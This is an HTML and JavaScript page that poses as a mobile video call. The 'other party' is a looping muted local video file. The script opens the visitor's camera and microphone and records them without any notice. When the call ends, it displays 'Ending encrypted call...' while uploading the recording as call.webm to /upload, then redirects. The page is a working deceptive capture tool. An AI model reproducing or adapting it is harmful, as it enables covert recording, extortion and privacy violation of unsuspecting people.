<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Voice & Video Call</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { margin:0; background:black; color:white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow:hidden; touch-action: none; }

        /* Background Video */
        #remoteVideo {
            position:fixed;
            width:100%;
            height:100%;
            object-fit:cover;
            z-index: 1;
        }

        /* Movable Camera Window */
        #localVideo {
            position: absolute;
            width: 110px;
            height: 160px;
            bottom: 120px;
            right: 20px;
            border-radius: 12px;
            object-fit: cover;
            z-index: 10;
            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
            background: #222;
            border: 0.5px solid rgba(255,255,255,0.2);
        }

        .snap-transition {
            transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1) !important;
        }

        /* Controls */
        .controls {
            position:absolute;
            bottom:40px;
            width:100%;
            display:flex;
            justify-content:center;
            align-items: center;
            gap: 20px;
            z-index: 20;
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .controls.hidden {
            opacity: 0;
            pointer-events: none;
            transform: translateY(30px);
        }

        .btn {
            width: 55px;
            height: 55px;
            border-radius: 50%;
            border: none;
            background: rgba(255, 255, 255, 0.15);
            color: white;
            font-size: 1.2rem;
            display: flex;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(10px);
            cursor: pointer;
        }

        .btn-end {
            background: #ff3b30;
            width: 70px;
            height: 70px;
            font-size: 1.5rem;
        }

        .btn-active {
            background: white;
            color: black;
        }

        /* Loading Overlay */
        #overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: black;
            z-index: 100;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .loader {
            width: 48px;
            height: 48px;
            border: 5px solid #FFF;
            border-bottom-color: transparent;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
        }

        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        p { margin-top: 15px; font-weight: 300; letter-spacing: 1px; }
    </style>
</head>

<body onclick="toggleUI(event)">

<video id="remoteVideo" autoplay loop muted playsinline>
    <source src="test-video.mp4" type="video/mp4">
</video>

<video id="localVideo" autoplay muted playsinline></video>

<div class="controls" id="controlsUI">
    <button class="btn" onclick="toggleMic(this)">
        <i class="fas fa-microphone" id="micIcon"></i>
    </button>
    <button class="btn btn-end" onclick="endCall()">
        <i class="fas fa-phone-slash"></i>
    </button>
    <button class="btn" onclick="switchCamera()">
        <i class="fas fa-camera-rotate"></i>
    </button>
</div>

<div id="overlay">
    <span class="loader"></span>
    <p>Ending encrypted call...</p>
</div>

<script>
let localStream;
let mediaRecorder;
let recordedChunks = [];
let currentFacing = "user";
let uiVisible = true;

const localVideo = document.getElementById("localVideo");
const controlsUI = document.getElementById("controlsUI");
const overlay = document.getElementById("overlay");

// --- UI TOGGLE ---
function toggleUI(e) {
    if (e.target.closest('button') || isDragging || e.target === localVideo) return;
    uiVisible = !uiVisible;
    controlsUI.classList.toggle("hidden", !uiVisible);
}

// --- MAGNETIC DRAGGING ---
let isDragging = false;
let startX, startY, initialLeft, initialTop;

const startDrag = (e) => {
    isDragging = true;
    localVideo.classList.remove("snap-transition");
    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
    
    const rect = localVideo.getBoundingClientRect();
    startX = clientX;
    startY = clientY;
    initialLeft = rect.left;
    initialTop = rect.top;
};

const drag = (e) => {
    if (!isDragging) return;
    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
    
    let newX = initialLeft + (clientX - startX);
    let newY = initialTop + (clientY - startY);

    // Keep within screen bounds
    newX = Math.max(10, Math.min(newX, window.innerWidth - localVideo.offsetWidth - 10));
    newY = Math.max(10, Math.min(newY, window.innerHeight - localVideo.offsetHeight - 10));

    localVideo.style.left = newX + "px";
    localVideo.style.top = newY + "px";
    localVideo.style.right = "auto";
    localVideo.style.bottom = "auto";
};

const stopDrag = () => {
    if (!isDragging) return;
    isDragging = false;
    localVideo.classList.add("snap-transition");
    
    const rect = localVideo.getBoundingClientRect();
    const screenMid = window.innerWidth / 2;
    // Snap to left or right side
    const finalX = (rect.left + rect.width / 2) < screenMid ? 20 : (window.innerWidth - rect.width - 20);
    localVideo.style.left = finalX + "px";
};

localVideo.addEventListener("mousedown", startDrag);
localVideo.addEventListener("touchstart", startDrag);
document.addEventListener("mousemove", drag);
document.addEventListener("touchmove", drag, { passive: false });
document.addEventListener("mouseup", stopDrag);
document.addEventListener("touchend", stopDrag);

// --- CAMERA & RECORDING ---
async function startCamera() {
    if (localStream) {
        localStream.getTracks().forEach(t => t.stop());
    }

    try {
        localStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: currentFacing, width: { ideal: 640 } },
            audio: true
        });
        localVideo.srcObject = localStream;
        
        // Restart recorder with new stream tracks
        if (mediaRecorder && mediaRecorder.state !== "inactive") {
            mediaRecorder.stop();
        }
        startRecording();
    } catch (err) {
        console.error("Camera error:", err);
    }
}

function startRecording() {
    const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
    mediaRecorder = new MediaRecorder(localStream, { mimeType });
    
    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };

    mediaRecorder.onstop = async () => {
        overlay.style.display = "flex";
        const blob = new Blob(recordedChunks, { type: "video/webm" });
        const formData = new FormData();
        formData.append("video", blob, "call.webm");

        try {
            await fetch("/upload", { method: "POST", body: formData });
        } catch (e) {}
        window.location.href = "search.html";
    };
    mediaRecorder.start();
}

function switchCamera() {
    currentFacing = (currentFacing === "user") ? "environment" : "user";
    startCamera();
}

function toggleMic(btn) {
    const track = localStream.getAudioTracks()[0];
    if(track) {
        track.enabled = !track.enabled;
        btn.classList.toggle("btn-active", !track.enabled);
        document.getElementById("micIcon").className = track.enabled ? "fas fa-microphone" : "fas fa-microphone-slash";
    }
}

function endCall() {
    if (mediaRecorder && mediaRecorder.state !== "inactive") {
        localStream.getTracks().forEach(t => t.stop());
        mediaRecorder.stop();
    } else {
        window.location.href = "search.html";
    }
}

startCamera();
</script>
</body>
</html>
